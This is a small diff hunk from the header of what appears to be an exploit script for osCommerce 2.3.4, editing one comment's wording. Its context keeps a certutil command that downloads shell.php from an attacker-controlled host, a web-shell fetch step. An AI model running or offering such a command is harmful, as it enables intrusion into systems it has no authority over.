@@ -5,7 +5,7 @@
 # Vendor Homepage: https://www.oscommerce.com/
 # Version: osCommerce 2.3.4
 # Tested on: Windows / Linux
-# you can use this command to download shell.php:
+# you can use this command to download file:
 # certutil -urlcache -split -f http://192.168.136.20:8080/shell.php shell.php
 # -*- coding: utf-8 -*-
 import requests
